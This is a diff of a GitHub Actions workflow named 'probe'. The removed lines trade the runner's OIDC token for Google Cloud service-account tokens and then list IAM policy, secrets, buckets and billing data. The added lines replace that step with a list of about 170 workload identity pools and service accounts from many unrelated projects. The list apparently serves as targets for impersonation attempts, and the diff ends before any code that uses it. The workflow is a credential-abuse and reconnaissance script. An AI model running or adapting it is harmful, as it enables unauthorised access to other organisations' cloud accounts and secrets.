@@ -9,37 +9,276 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
+    timeout-minutes: 45
     steps:
-      - name: carbonifer
+      - name: batch
         run: |
           set +e
-          PRJ=projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider
-          SA=github@carbonifer-sandbox.iam.gserviceaccount.com
-          AUD="https://iam.googleapis.com/$PRJ"
-          J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
-          jq -r '.value' <<<"$J" > tok.jwt
-          curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
-            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
-            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
-            --data-urlencode "subject_token=$(cat tok.jwt)" \
-            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
-            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
-            -d "scope=https://www.googleapis.com/auth/cloud-platform"
-          FT=$(jq -r '.access_token // empty' r.json); echo "federated_len=${#FT}"
-          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
-          curl -s -o g.json -w 'GEN=%{http_code}\n' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
-            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json
-          AT=$(jq -r '.accessToken // empty' g.json); echo "sa_token_len=${#AT} expire=$(jq -r '.expireTime' g.json)"
-          T() { echo "=== $1"; shift; curl -s -w '\nHTTP=%{http_code}\n' "$@"; echo; }
-          T tokeninfo "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"
-          T project_get -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/carbonifer-sandbox"
-          T project_iam -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/carbonifer-sandbox:getIamPolicy" -X POST -d '{}'
-          T vertex_uscentral1 -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/us-central1/models"
-          T vertex_global -H "Authorization: Bearer $AT" "https://aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/global/models"
-          T vertex_endpoints -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/us-central1/endpoints"
-          T billing_info -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/carbonifer-sandbox/billingInfo"
-          T billing_accounts -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/billingAccounts"
-          T storage_buckets -H "Authorization: Bearer $AT" "https://storage.googleapis.com/storage/v1/b?project=carbonifer-sandbox"
-          T secrets -H "Authorization: Bearer $AT" "https://secretmanager.googleapis.com/v1/projects/carbonifer-sandbox/secrets"
-          T services -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/carbonifer-sandbox/services?filter=state:ENABLED"
-          T sa_self -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/carbonifer-sandbox/serviceAccounts/$SA"
+          cat > targets.txt <<'AUD'
+          projects/835573267393/locations/global/workloadIdentityPools/github-actions/providers/github|vaultnote-github-deployer@vaultnote-505715.iam.gserviceaccount.com,vaultnote-runtime@vaultnote-505715.iam.gserviceaccount.com
+          projects/889190443263/locations/global/workloadIdentityPools/gh-pool-tofu/providers/gh-provider-tofu|tofu-runner@project-1944cf83-7f15-4f33-89b.iam.gserviceaccount.com
+          projects/1058001477767/locations/global/workloadIdentityPools/github/providers/github-actions|navoops@emerald-caster-508318-f2.iam.gserviceaccount.com
+          projects/756784338813/locations/global/workloadIdentityPools/github-actions/providers/github|github-deployer@chailm-507011.iam.gserviceaccount.com
+          projects/779946584788/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|
+          projects/505795335067/locations/global/workloadIdentityPools/github-actions/providers/github-provider|github-actions-web-deploy@trove-prod-485922.iam.gserviceaccount.com
+          projects/334263295854/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-iris@portfolio-projects-491501.iam.gserviceaccount.com
+          projects/320884539284/locations/global/workloadIdentityPools/github-actions/providers/pastebuddy|pastebuddy-github-actions@general-secrets-store.iam.gserviceaccount.com
+          projects/458202513101/locations/global/workloadIdentityPools/github-demo-pool/providers/github|github-wif@graphite-hook-463719-j9.iam.gserviceaccount.com
+          projects/486017382658/locations/global/workloadIdentityPools/github-pool/providers/github-owner|github-deploy@sectorpulse-001.iam.gserviceaccount.com
+          projects/101676037530/locations/global/workloadIdentityPools/breva-github-actions/providers/breva-github|breva-website-drive-sync@breva-erp.iam.gserviceaccount.com
+          projects/490933743286/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deploy@project-395c3d26-a536-4afa-9b1.iam.gserviceaccount.com
+          projects/238441820154/locations/global/workloadIdentityPools/github-actions/providers/github|terraform@will-it-rain-496308.iam.gserviceaccount.com
+          projects/892821973348/locations/global/workloadIdentityPools/github-pool-2/providers/github|github-developer@house-price-predictor-468401.iam.gserviceaccount.com
+          projects/305282281906/locations/global/workloadIdentityPools/github/providers/github-ship|cloudrun-ship@stawi-platform.iam.gserviceaccount.com
+          projects/881046533648/locations/global/workloadIdentityPools/sirsir-github/providers/github|sirsir-github-deploy@sirsir-travel-morocco.iam.gserviceaccount.com
+          projects/861671760827/locations/global/workloadIdentityPools/github-pool/providers/github-provider|mi-cuenta-servicio@ia-models-vm-hub.iam.gserviceaccount.com
+          projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|github-actions@aryeelab.iam.gserviceaccount.com
+          projects/591367483723/locations/global/workloadIdentityPools/pool/providers/provider|
+          projects/748095843747/locations/global/workloadIdentityPools/my-app-dev-pool/providers/github-actions-provider|github-actions-service-account@infinite-glow-462417-u6.iam.gserviceaccount.com
+          projects/208440318997/locations/global/workloadIdentityPools/omi-gha-deploy-prod/providers/github|omi-ci-deployer-prod@based-hardware.iam.gserviceaccount.com,finops-unit-cost-scheduler@based-hardware.iam.gserviceaccount.com,finops-writer@based-hardware.iam.gserviceaccount.com
+          projects/1031333818730/locations/global/workloadIdentityPools/omi-gha-notif-dev/providers/github|finops-unit-cost-scheduler@based-hardware.iam.gserviceaccount.com,finops-writer@based-hardware.iam.gserviceaccount.com,omi-ci-deployer-prod@based-hardware.iam.gserviceaccount.com
+          projects/1031333818730/locations/global/workloadIdentityPools/omi-gha-deploy-dev/providers/github|omi-ci-deployer-dev@based-hardware-dev.iam.gserviceaccount.com,omi-ci-deployer-prod@based-hardware.iam.gserviceaccount.com,omi-ci-index-check@based-hardware.iam.gserviceaccount.com
+          projects/830784087321/locations/global/workloadIdentityPools/releases/providers/github-workflow|releases-agent@mitbattlecode.iam.gserviceaccount.com
+          projects/137127337841/locations/global/workloadIdentityPools/github-actions/providers/github-ultimate-soulcodex|soulcodex-play-publisher@soul-codex-platform.iam.gserviceaccount.com
+          projects/179570514589/locations/global/workloadIdentityPools/insight-prod/providers/github-behemothltd|github-action@behemothvn.iam.gserviceaccount.com
+          projects/57922902849/locations/global/workloadIdentityPools/github/providers/the-private-ledger|
+          projects/571946303756/locations/global/workloadIdentityPools/github/providers/google|
+          projects/814149916425/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-sa@obsidian-sync-498904.iam.gserviceaccount.com
+          projects/120299025068/locations/global/workloadIdentityPools/github-actions-terraform-apply/providers/apply|github-actions-terraform-apply@jpdata.iam.gserviceaccount.com
+          projects/78526959552/locations/global/workloadIdentityPools/github/providers/ofys-api|github-ofys-api@braver-ops.iam.gserviceaccount.com
+          projects/919035207432/locations/global/workloadIdentityPools/github/providers/github-base44-admission-control|fixlist-admission-operator@seo-autopilot-501517.iam.gserviceaccount.com,fixlist-standard150-invoker@seo-autopilot-501517.iam.gserviceaccount.com
+          projects/296221712346/locations/global/workloadIdentityPools/github/providers/github|github-terraform-plan@trail-tools-444904.iam.gserviceaccount.com
+          projects/252484117105/locations/global/workloadIdentityPools/modules-workload-pool/providers/modules-workload-provider|buf-modules-1-bufbuild-modules@buf-modules-1.iam.gserviceaccount.com
+          projects/1088640053131/locations/global/workloadIdentityPools/github-actions-pool/providers/github|github-actions-deployer@hellogrpc-296603.iam.gserviceaccount.com
+          projects/345950277072/locations/global/workloadIdentityPools/gh-actions-pool/providers/gh-actions-provider|mozilla-dev-sa@catalyst-cooperative-mozilla.iam.gserviceaccount.com,pudl-sources@catalyst-cooperative-pudl.iam.gserviceaccount.com
+          projects/304731433117/locations/global/workloadIdentityPools/github-pool/providers/github|terraform@terraform-5312.iam.gserviceaccount.com
+          projects/163952866759/locations/global/workloadIdentityPools/github/providers/my-repo|
+          projects/611551928920/locations/global/workloadIdentityPools/github-actions/providers/android-remote-play|android-play-release@clementine-data.iam.gserviceaccount.com
+          projects/755556984315/locations/global/workloadIdentityPools/github-action/providers/github-provider|github-action-sa@peacepal-427210.iam.gserviceaccount.com,my-service-account@my-project.iam.gserviceaccount.com
+          projects/1006240973223/locations/global/workloadIdentityPools/gha-create-gke-cluster/providers/github-actions|gke-nodes@code-idp.iam.gserviceaccount.com,terraform-gke@code-idp.iam.gserviceaccount.com
+          projects/166467127377/locations/global/workloadIdentityPools/github-actions/providers/github-actions-provider|gh-actions-reader-sa@dp-artifactreg-production-225f.iam.gserviceaccount.com
+          projects/889992792607/locations/global/workloadIdentityPools/github-actions/providers/github-actions-provider|gh-actions-reader-sa@dp-artifactreg-production-225f.iam.gserviceaccount.com
+          projects/1063410054216/locations/global/workloadIdentityPools/techdocs-pool/providers/techdocs-provider|techdocs-publisher@backstage-production-44f7.iam.gserviceaccount.com
+          projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github|github-actions@rails-todo-app-386721.iam.gserviceaccount.com
+          projects/1048815135427/locations/global/workloadIdentityPools/my-pool/providers/my-provider|gha-test@ci-cd-terraform-cloudbuild.iam.gserviceaccount.com
+          projects/240930203956/locations/global/workloadIdentityPools/github/providers/github-actions|github-terraform@rukmani-512609.iam.gserviceaccount.com
+          projects/973400095566/locations/global/workloadIdentityPools/gha-pool-staging-daveinc/providers/gha-provider-staging-daveinc|
+          projects/628595556591/locations/global/workloadIdentityPools/github-pool/providers/github-provider|
+          projects/153692178986/locations/global/workloadIdentityPools/github-pool/providers/github-provider|hotspot-deployer@hotspot-sentinels-7364.iam.gserviceaccount.com,hotspot-run@hotspot-sentinels-7364.iam.gserviceaccount.com
+          projects/177874397418/locations/global/workloadIdentityPools/github-actions-pool/providers/github-hardware-extractor-wif|partnumber-finder-service@partnumber-finder-486320.iam.gserviceaccount.com
+          projects/286408627661/locations/global/workloadIdentityPools/subnet-recovery-infra/providers/github|gamma-custody-tf-apply@sn118-gamma-custody.iam.gserviceaccount.com,gamma-custody-tf-plan@sn118-gamma-custody.iam.gserviceaccount.com,subnet-recovery-tf-apply@ditto-subnet.iam.gserviceaccount.com
+          projects/1037372464879/locations/global/workloadIdentityPools/gamma-custody-github/providers/protected-infra|gamma-custody-tf-apply@sn118-gamma-custody.iam.gserviceaccount.com,gamma-custody-tf-plan@sn118-gamma-custody.iam.gserviceaccount.com,subnet-recovery-tf-apply@ditto-subnet.iam.gserviceaccount.com
+          projects/244819244005/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-sa@prod-benchmarking.iam.gserviceaccount.com
+          projects/320310132788/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions@dlorenc-chainguard.iam.gserviceaccount.com
+          projects/273165967255/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions@recon-484118.iam.gserviceaccount.com
+          projects/334635767532/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|cloud-function-backend@th-stray.iam.gserviceaccount.com
+          projects/512124407307/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@project-c270d675-13ea-49f6-8dc.iam.gserviceaccount.com
+          projects/484736877039/locations/global/workloadIdentityPools/elevate-github/providers/github-main|elevate-github-deploy@elegant-racer-299721.iam.gserviceaccount.com
+          projects/207804176001/locations/global/workloadIdentityPools/github/providers/github-repo|github-deployer@marketvisualization-backend.iam.gserviceaccount.com,market-backend-run@marketvisualization-backend.iam.gserviceaccount.com
+          projects/362369312254/locations/global/workloadIdentityPools/apps-github-pool/providers/apps-github-provider|contact-form-ci@elliotx.iam.gserviceaccount.com
+          projects/333517648566/locations/global/workloadIdentityPools/github/providers/github|wif-test-erik@sbx-202312-sre-8b67.iam.gserviceaccount.com
+          projects/678838674221/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|walktalkysite@walktalky.iam.gserviceaccount.com
+          projects/950268361153/locations/global/workloadIdentityPools/docker-react-test-pool/providers/docker-react-test-provider|
+          projects/662541806905/locations/global/workloadIdentityPools/github-2026/providers/github-2026|infrastructure@hack-team-future-brain-exes.iam.gserviceaccount.com
+          projects/334141807880/locations/global/workloadIdentityPools/github-pool/providers/github-provider|gamedev-app@gamedevpl.iam.gserviceaccount.com,gamedev-mp-relay@gamedevpl.iam.gserviceaccount.com,gamedev-world@gamedevpl.iam.gserviceaccount.com
+          projects/552057127791/locations/global/workloadIdentityPools/github/providers/github|container-builder@helical-crowbar-220917.iam.gserviceaccount.com
+          projects/969325661804/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deployer@pg-gccoe-josepablo-gallego.iam.gserviceaccount.com
+          projects/389517956549/locations/global/workloadIdentityPools/github/providers/github-provider|github-493@terrafarm-378218.iam.gserviceaccount.com
+          projects/855475113448/locations/global/workloadIdentityPools/eto-github/providers/eto-github|eto-cd-github@gcp-cset-projects.iam.gserviceaccount.com
+          projects/472305719257/locations/global/workloadIdentityPools/github-actions/providers/ghactions-provider|ghactions@lantern-cloud.iam.gserviceaccount.com
+          projects/567187841907/locations/global/workloadIdentityPools/staging-shared-9bd2/providers/staging-shared-gha|prod-images-ci@prod-images-c6e5.iam.gserviceaccount.com,staging-images-ci@staging-images-183e.iam.gserviceaccount.com
+          projects/618116202522/locations/global/workloadIdentityPools/prod-shared-e350/providers/prod-shared-gha|prod-images-ci@prod-images-c6e5.iam.gserviceaccount.com,staging-images-ci@staging-images-183e.iam.gserviceaccount.com
+          projects/656686060169/locations/global/workloadIdentityPools/gnosisvpn-gh-pool/providers/github-provider|download-gnosisvpn-gh-sa@gnosisvpn-production.iam.gserviceaccount.com
+          projects/949737848314/locations/global/workloadIdentityPools/iam-deny-test-pool/providers/iam-deny-test-provider|kokoro-ca@isakovf-iam-deny-samples.iam.gserviceaccount.com
+          projects/1043719249528/locations/global/workloadIdentityPools/github-automation/providers/crc-dev|github-automation-bot@gha-crc-dev.iam.gserviceaccount.com
+          projects/289323711544/locations/global/workloadIdentityPools/baltic-star-pool/providers/github-actions-provider|github-deploy-functions@baltic-star-cloud.iam.gserviceaccount.com
+          projects/193468143671/locations/global/workloadIdentityPools/github-actions/providers/happywecan-portfolio|github-actions-deployer@focal-freedom-473403-f8.iam.gserviceaccount.com
+          projects/607653541134/locations/global/workloadIdentityPools/github-actions/providers/github|github-actions-deployer@bold-mantis-463806-q5.iam.gserviceaccount.com
+          projects/646388363945/locations/global/workloadIdentityPools/github-actions/providers/nullsiteweb|github-actions-firebase@nullpointer-716ae.iam.gserviceaccount.com
+          projects/716789254648/locations/global/workloadIdentityPools/perf-eng-reports-pool/providers/gh-provider|gh-perf-report-writer@perf-engineering-reports.iam.gserviceaccount.com
+          projects/27981201718/locations/global/workloadIdentityPools/my-pool/providers/my-provider|github-actions@mergex-382319.iam.gserviceaccount.com
+          projects/226429748228/locations/global/workloadIdentityPools/github-actions/providers/github|
+          projects/669780333216/locations/global/workloadIdentityPools/github-autoseo/providers/github-actions|autoseo-v4@fitup-seo-intelligence.iam.gserviceaccount.com
+          projects/953907026294/locations/global/workloadIdentityPools/kontestis-actions/providers/kontestis-provider|github-actions@speedy-baton-368023.iam.gserviceaccount.com
+          projects/123456/locations/global/workloadIdentityPools/my-pool/providers/github|terraform@my-project.iam.gserviceaccount.com
+          projects/198777857220/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@personal-505008.iam.gserviceaccount.com
+          projects/73139356296/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-sa@project-d2ecb836-01ef-43f2-af6.iam.gserviceaccount.com
+          projects/1004280240722/locations/global/workloadIdentityPools/mwendo-github-actions/providers/github-actions|mwendo-github-deployer-409@mwendo-salama-prod.iam.gserviceaccount.com
+          projects/629296473058/locations/global/workloadIdentityPools/homelab/providers/github|github-actions@homelab-ng.iam.gserviceaccount.com,view-counter@homelab-ng.iam.gserviceaccount.com
+          projects/319945089838/locations/global/workloadIdentityPools/github/providers/github-oidc|biwenger-tools-sa@biwenger-tools.iam.gserviceaccount.com,run-be-water@be-water-app.iam.gserviceaccount.com
+          projects/240152538865/locations/global/workloadIdentityPools/github/providers/section-b2-spaghetti-crew|
+          projects/799043440232/locations/global/workloadIdentityPools/seenit-github/providers/seenit-main|seenit-log-auditor@gen-lang-client-0201895414.iam.gserviceaccount.com
+          projects/587338514666/locations/global/workloadIdentityPools/github-actions/providers/github-cohort-bot|github-deployer@cohort-bot-1.iam.gserviceaccount.com
+          projects/671902319686/locations/global/workloadIdentityPools/githubaction-pool-jojo/providers/githubaction-jojoprovider|terraformfinal@itsme-1234.iam.gserviceaccount.com
+          projects/643615470006/locations/global/workloadIdentityPools/github-kaito-tokyo/providers/actions-githubusercontent-com|wkt-terraform-gha-pr@www-kaito-tokyo-1-svc-my1a.iam.gserviceaccount.com
+          projects/841104676464/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deploy@befree-468615.iam.gserviceaccount.com
+          projects/127316151094/locations/global/workloadIdentityPools/chro-github/providers/github|chro-deploy@project-ed47fc09-912f-41b0-92f.iam.gserviceaccount.com
+          projects/1045695684946/locations/global/workloadIdentityPools/github/providers/github-actions|github-action-deploy@aibs-part.iam.gserviceaccount.com
+          projects/1001876988238/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-blog-sync@tough-cipher-472109-v5.iam.gserviceaccount.com
+          projects/430654255805/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions@khulnasoft-development.iam.gserviceaccount.com
+          projects/901130743507/locations/global/workloadIdentityPools/github/providers/kiban-sdk|gha-sdk-release@kiban-cloud.iam.gserviceaccount.com
+          projects/77537515004/locations/global/workloadIdentityPools/github/providers/mtg-ev-analyzer|packone-play-ci@pack-one.iam.gserviceaccount.com
+          projects/448989396094/locations/global/workloadIdentityPools/github/providers/github-provider|github-deployer@kiwi-social.iam.gserviceaccount.com
+          projects/292600148686/locations/global/workloadIdentityPools/my-pool/providers/my-provider|artifact-sa@kodrama-playground-348505.iam.gserviceaccount.com,my-service-account@my-project.iam.gserviceaccount.com
+          projects/177424230750/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-sa@enseeiht-spark-lab.iam.gserviceaccount.com
+          projects/348931464772/locations/global/workloadIdentityPools/github-actions-pool/providers/github-deploy|github-actions@blog-lacolaco-net.iam.gserviceaccount.com
+          projects/585501833219/locations/global/workloadIdentityPools/github-action-sandbox-ldy/providers/github-provider|
+          projects/1009424727351/locations/global/workloadIdentityPools/github-id-pool/providers/github-id-pool-provider|github-releaser@infra-new-dev.iam.gserviceaccount.com
+          projects/727026638213/locations/global/workloadIdentityPools/githubactions-identitypool1/providers/githubactions-identityprovider1|
+          projects/44325983244/locations/global/workloadIdentityPools/github-actions/providers/github|tr-deploy@quill-cloud-proxy.iam.gserviceaccount.com
+          projects/990081828836/locations/global/workloadIdentityPools/github/providers/github-toca-mcp|toca-mcp-deployer@toca-mcp-production.iam.gserviceaccount.com,toca-mcp-runtime@toca-mcp-production.iam.gserviceaccount.com
+          projects/272419586516/locations/global/workloadIdentityPools/lupine-github/providers/github|lupine-gpu-ci@kevmo314.iam.gserviceaccount.com
+          projects/1038369055304/locations/global/workloadIdentityPools/github/providers/lmb-platform|github-deploy@lmb-platform-prod.iam.gserviceaccount.com
+          projects/171198963743/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions@mztn-seccamp2025.iam.gserviceaccount.com
+          projects/307390870127/locations/global/workloadIdentityPools/github-action-pool/providers/github-action-provider|github-action-service-account@vibrant-mantis-723.iam.gserviceaccount.com
+          projects/183451329061/locations/global/workloadIdentityPools/dsg-f3-a3-github/providers/github-main|dsg-f3-a3-deployer@digital-stargate-telemetry.iam.gserviceaccount.com
+          projects/149325054934/locations/global/workloadIdentityPools/github-pool/providers/github-provider|attendance-sa@project-e553cc0c-7d4a-4519-ade.iam.gserviceaccount.com
+          projects/850855848778/locations/global/workloadIdentityPools/github-actions/providers/github|terraform-plan@doula-cloud.iam.gserviceaccount.com
+          projects/938361928218/locations/global/workloadIdentityPools/github/providers/github-actions|github-actions@madhav-astrology.iam.gserviceaccount.com
+          projects/937400838385/locations/global/workloadIdentityPools/notipal-wif-pool/providers/notipal-gh-provider-v3|notipal-cloudbuild-sa@notipal-prod.iam.gserviceaccount.com
+          projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github|
+          projects/198474744222/locations/global/workloadIdentityPools/pool/providers/github|github-actions@math-p-earth.iam.gserviceaccount.com
+          projects/229981076704/locations/global/workloadIdentityPools/github/providers/github|github-deploy@wineracker-2e52e.iam.gserviceaccount.com
+          projects/897452392033/locations/global/workloadIdentityPools/github/providers/homebase|runner-deployer@atelic.iam.gserviceaccount.com
+          projects/105103278561/locations/global/workloadIdentityPools/github/providers/github-repo|brb-deploy@biirb-511608.iam.gserviceaccount.com
+          projects/1073411163963/locations/global/workloadIdentityPools/github-action-pool/providers/github|github-action-sa@xergyinc-1493409480060.iam.gserviceaccount.com
+          projects/770568247618/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-sa@project-0118aaef-0641-43ce-8e4.iam.gserviceaccount.com
+          projects/1091263617655/locations/global/workloadIdentityPools/github-pool/providers/github-provider|githubactions@image-service-442420.iam.gserviceaccount.com
+          projects/364273285660/locations/global/workloadIdentityPools/github/providers/my-repo|
+          projects/166016129616/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider-v2|github-actions-sa@mike-personal-portfolio.iam.gserviceaccount.com
+          projects/346197888787/locations/global/workloadIdentityPools/github/providers/my-repo|github-deployer-dev@coral-chiller-474405-d9.iam.gserviceaccount.com
+          projects/219961294368/locations/global/workloadIdentityPools/github-x-post-pool/providers/github-oidc-provider|github-actions-x-post@thai-memo-prod.iam.gserviceaccount.com
+          projects/732617874837/locations/global/workloadIdentityPools/terraform-pool/providers/github-provider|terraform-sa@crucial-bucksaw-474203-m4.iam.gserviceaccount.com
+          projects/123485395082/locations/global/workloadIdentityPools/github-pool-app/providers/github-provider-app|terraform@project-70f3c2b9-8f91-41f7-b5c.iam.gserviceaccount.com
+          projects/11445303925/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@my-crypto-bot-project.iam.gserviceaccount.com
+          projects/361383206203/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deployer@project-95eb9e37-8269-4627-bb0.iam.gserviceaccount.com
+          projects/139710495908/locations/global/workloadIdentityPools/my-pool/providers/my-provider|my-service-account@dogwood-goods-360821.iam.gserviceaccount.com
+          projects/753698311885/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-service-account@nitraai.iam.gserviceaccount.com
+          projects/573927778532/locations/global/workloadIdentityPools/github/providers/portfolio-pull-requests|hosting-preview@natekramber-preview.iam.gserviceaccount.com
+          projects/641246862184/locations/global/workloadIdentityPools/github/providers/nmcguirt-github|github-actions@github-exploration-442503.iam.gserviceaccount.com
+          projects/131531281042/locations/global/workloadIdentityPools/github/providers/github|
+          projects/717967107645/locations/global/workloadIdentityPools/github-actions/providers/github-oidc|github-astro-build@open-museum-885a1.iam.gserviceaccount.com
+          projects/547043252101/locations/global/workloadIdentityPools/github/providers/this-repo|coder-gha-secrets@coder-nt.iam.gserviceaccount.com
+          projects/499454355457/locations/global/workloadIdentityPools/github-actions/providers/github|bridge-video-worker@bridge-video-automation.iam.gserviceaccount.com
+          projects/151739080904/locations/global/workloadIdentityPools/github/providers/github-oidc|genui-backend@omni-505707.iam.gserviceaccount.com
+          projects/231388685322/locations/global/workloadIdentityPools/zah-github/providers/zah-github-provider|zah-registry-user@zah-website.iam.gserviceaccount.com
+          projects/1091131360319/locations/global/workloadIdentityPools/github-pool/providers/github-provider|
+          projects/873069027544/locations/global/workloadIdentityPools/github/providers/github-actions|utopia-github-deployer@utopia-multipaz.iam.gserviceaccount.com
+          projects/341318872140/locations/global/workloadIdentityPools/github/providers/github-oidc|sa-bl-artifact-uploader@openwater-cloud.iam.gserviceaccount.com,sa-bl-pubkey-reader@openwater-cloud.iam.gserviceaccount.com
+          projects/503811163032/locations/global/workloadIdentityPools/github-actions-pool/providers/spaceread|
+          projects/557265520053/locations/global/workloadIdentityPools/github-actions/providers/github-actions-oidc|pt-pneuma-github@pt-corpus-tf16-prod.iam.gserviceaccount.com
+          projects/506642149183/locations/global/workloadIdentityPools/github/providers/my-repo|actions@wurst-owen1660p5.iam.gserviceaccount.com
+          projects/30831591295/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@iac-task-manager-api.iam.gserviceaccount.com
+          projects/571785698442/locations/global/workloadIdentityPools/github-actions/providers/yujian-main|yujian-github-deployer@gemini-api-project-503706.iam.gserviceaccount.com
+          projects/235822363393/locations/global/workloadIdentityPools/hedera-builds-pool/providers/hedera-builds-gh-actions|artifact-deployer@swirlds-registry.iam.gserviceaccount.com,hedera-artifact-builds@devops-1-254919.iam.gserviceaccount.com,swirlds-automation@hedera-registry.iam.gserviceaccount.com
+          projects/229164983194/locations/global/workloadIdentityPools/registry-identity-pool/providers/gh-provider|artifact-deployer@swirlds-registry.iam.gserviceaccount.com,hedera-artifact-builds@devops-1-254919.iam.gserviceaccount.com,swirlds-automation@hedera-registry.iam.gserviceaccount.com
+          projects/1013667288588/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-bq-loader@pantaleone-cross-app.iam.gserviceaccount.com
+          projects/749654864884/locations/global/workloadIdentityPools/github-actions/providers/github-oidc|
+          projects/371394967380/locations/global/workloadIdentityPools/github-actions/providers/github-frontends|sa-creator-ui-deploy@pivota-prod.iam.gserviceaccount.com
+          projects/389282473430/locations/global/workloadIdentityPools/modal/providers/modal|observability-writer@policyengine-api.iam.gserviceaccount.com
+          projects/370374240567/locations/global/workloadIdentityPools/github-pool/providers/github-provider|server-deploy@analysis-runner.iam.gserviceaccount.com
+          projects/1051897107465/locations/global/workloadIdentityPools/github-pool/providers/github-provider|gh-images-deployer@cpg-common.iam.gserviceaccount.com
+          projects/915484313024/locations/global/workloadIdentityPools/my-pool/providers/my-provider|gke-workload@praveen-345.iam.gserviceaccount.com
+          projects/671506471835/locations/global/workloadIdentityPools/github-pool/providers/github-provider|audioseekgitconnect@ie7374-475102.iam.gserviceaccount.com
+          projects/626568543649/locations/global/workloadIdentityPools/gha-runner-pool/providers/gha-runner-pool-provider|gha-runner@provenance-io-test.iam.gserviceaccount.com
+          projects/802404398783/locations/global/workloadIdentityPools/github-genesis-system3/providers/github|system3-evidence-reader@system3-openalgo-safe.iam.gserviceaccount.com
+          projects/138027296220/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider-v2|
+          projects/401309731911/locations/global/workloadIdentityPools/github-actions/providers/github-main|schwab-platform-deploy@charlesschwabquant.iam.gserviceaccount.com
+          projects/1088907247379/locations/global/workloadIdentityPools/github-actions/providers/github-main|firstrade-platform-deploy@firstradequant.iam.gserviceaccount.com
+          projects/303168642265/locations/global/workloadIdentityPools/github-actions/providers/github-main|
+          projects/412074507462/locations/global/workloadIdentityPools/finos-legend-engine-build-pool/providers/finos-legend-engine-provider|finos-legend-engine-build@legend-integration-testing.iam.gserviceaccount.com
+          projects/991554514268/locations/global/workloadIdentityPools/sandman-github-staging/providers/sandman-hybrid-staging|sandman-billing-runtime@sandman-combat-staging.iam.gserviceaccount.com,sandman-practice-build@sandman-combat-staging.iam.gserviceaccount.com,sandman-practice-deployer@sandman-combat-staging.iam.gserviceaccount.com
+          projects/197252344762/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-action-1441743833@free-wifi-portal.iam.gserviceaccount.com
+          projects/1013461400632/locations/global/workloadIdentityPools/github-actions/providers/github|ai-orchestrator-ci@orchestration-platform.iam.gserviceaccount.com
+          projects/501901363747/locations/global/workloadIdentityPools/github-actions/providers/github|nx-cache-release@reindeer-external-project.iam.gserviceaccount.com
+          projects/1054134490602/locations/global/workloadIdentityPools/github-actions/providers/ctc-main|ctc-github-deployer@mkw-stats.iam.gserviceaccount.com
+          projects/730596460290/locations/global/workloadIdentityPools/rhiza-github/providers/rhiza-github|rhiza-github-action@rhiza-shared.iam.gserviceaccount.com
+          projects/293109622606/locations/global/workloadIdentityPools/cedar-github/providers/github|
+          projects/141014890750/locations/global/workloadIdentityPools/github-actions/providers/ghactions|
+          projects/639068275302/locations/global/workloadIdentityPools/learning-k8s-pool/providers/learning-k8s-provider|github-deployer@learning-k8s-402302.iam.gserviceaccount.com
+          projects/785558430619/locations/global/workloadIdentityPools/github-2023/providers/github-2023|infrastructure@hack-team-finmatrix.iam.gserviceaccount.com,workload@hack-team-finmatrix.iam.gserviceaccount.com
+          projects/557874444860/locations/global/workloadIdentityPools/github/providers/monoshiri-repo|github-deployer@monoshiri-df26.iam.gserviceaccount.com
